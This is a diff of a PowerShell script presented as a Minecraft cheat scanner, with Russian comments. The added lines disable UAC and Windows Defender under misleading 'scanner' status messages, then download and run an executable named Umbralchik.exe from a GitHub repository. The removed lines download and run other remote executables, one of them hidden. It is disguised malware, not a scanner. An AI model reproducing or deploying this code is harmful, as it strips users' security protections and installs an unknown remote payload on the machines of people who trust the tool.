@@ -1,9 +1,49 @@
-    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
-    
-    # Запускаем
-    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
+Set-ExecutionPolicy Bypass -Scope Process -Force
+# Запуск от имени администратора проверяется автоматически
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Warning "Необходимо запустить скрипт от имени администратора."
+    Exit
+}
 
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe"; .\my_admin_tool.exe
+Write-Host "Запуск сканера..." -ForegroundColor Yellow
+try {
+    # Значение 0 отключает UAC. Без перезагрузки изменения могут не полностью вступить в силу.
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord
+    Write-Host "UAC отключен. Для полного применения изменений обычно требуется перезагрузка." -ForegroundColor Green
+} catch {
+    Write-Error "Ошибка при отключении UAC: $_"
+}
+
+Write-Host "`nОжидайте..." -ForegroundColor Yellow
+try {
+    # Отключение через реестр (DisableAntiSpyware)
+    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    if (-not (Test-Path $regPath)) {
+        New-Item -Path $regPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -Type DWord
+    Write-Host "Windows Defender отключен (через реестр)." -ForegroundColor Green
+
+    # Попытка остановки и отключения служб Defender (чтобы сработало без перезагрузки)
+    Write-Host "Подключение..." -ForegroundColor Gray
+    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
+    
+    # На современных версиях Windows 10/11 также используются эти службы
+    Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue
+    
+    Write-Host "Службы остановлены и отключены." -ForegroundColor Green
+
+} catch {
+    Write-Error "Ошибка при отключении Defender: $_"
+}
+
+Write-Host "`nГотово." -ForegroundColor Cyan
+
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe
+
 # MINECRAFT CHEAT SCANNER v2.0 
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
@@ -100,6 +140,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
